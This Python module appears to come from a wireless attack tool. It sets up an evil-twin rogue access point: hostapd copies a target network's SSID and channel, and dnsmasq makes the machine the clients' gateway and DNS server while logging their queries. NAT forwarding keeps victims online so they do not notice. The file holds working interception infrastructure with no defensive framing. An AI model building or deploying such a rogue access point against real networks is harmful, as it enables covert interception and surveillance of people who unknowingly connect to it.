import subprocess
import os

HOSTAPD_CONF = "/tmp/wispy_hostapd.conf"
DNSMASQ_CONF = "/tmp/wispy_dnsmasq.conf"
AP_IP = "192.168.50.1"
DHCP_RANGE = "192.168.50.10,192.168.50.100,12h"


def configure_interface(interface="wlan0"):
    """Switches interface to managed mode and assigns the AP IP address."""
    subprocess.run(["sudo", "ip", "link", "set", interface, "down"], check=True)
    subprocess.run(["sudo", "iwconfig", interface, "mode", "managed"], check=True)
    subprocess.run(["sudo", "ip", "link", "set", interface, "up"], check=True)
    subprocess.run(["sudo", "ip", "addr", "flush", "dev", interface], check=True)
    subprocess.run(["sudo", "ip", "addr", "add", f"{AP_IP}/24", "dev", interface], check=True)


def write_hostapd_conf(ssid, channel, interface="wlan0"):
    """Writes a hostapd config that mimics the target network's SSID and channel."""
    config = f"""interface={interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
auth_algs=1
wmm_enabled=0
"""
    with open(HOSTAPD_CONF, "w") as f:
        f.write(config)


def write_dnsmasq_conf(interface="wlan0"):
    """Writes a dnsmasq config for DHCP and DNS on the rogue AP interface."""
    config = f"""interface={interface}
dhcp-range={DHCP_RANGE}
dhcp-option=3,{AP_IP}
dhcp-option=6,{AP_IP}
server=8.8.8.8
log-queries
"""
    with open(DNSMASQ_CONF, "w") as f:
        f.write(config)


def enable_routing(outbound_interface="eth0"):
    """Enables IP forwarding and NAT so connected clients have internet access."""
    subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
    subprocess.run([
        "sudo", "iptables", "-t", "nat", "-A", "POSTROUTING",
        "-o", outbound_interface, "-j", "MASQUERADE"
    ], check=True)


def start_hostapd():
    """Starts hostapd as a background process."""
    return subprocess.Popen(["sudo", "hostapd", HOSTAPD_CONF])


def start_dnsmasq():
    """Starts dnsmasq as a background process."""
    return subprocess.Popen(["sudo", "dnsmasq", "-C", DNSMASQ_CONF, "--no-daemon"])


def teardown(processes, interface="wlan0", outbound_interface="eth0"):
    """Kills all started processes and cleans up iptables and interface state."""
    print("\n[*] Shutting down...")
    for p in processes:
        p.terminate()

    subprocess.run([
        "sudo", "iptables", "-t", "nat", "-D", "POSTROUTING",
        "-o", outbound_interface, "-j", "MASQUERADE"
    ], capture_output=True)

    subprocess.run(["sudo", "ip", "addr", "flush", "dev", interface], capture_output=True)

    for f in [HOSTAPD_CONF, DNSMASQ_CONF]:
        if os.path.exists(f):
            os.remove(f)

    print("[*] Cleanup done.")
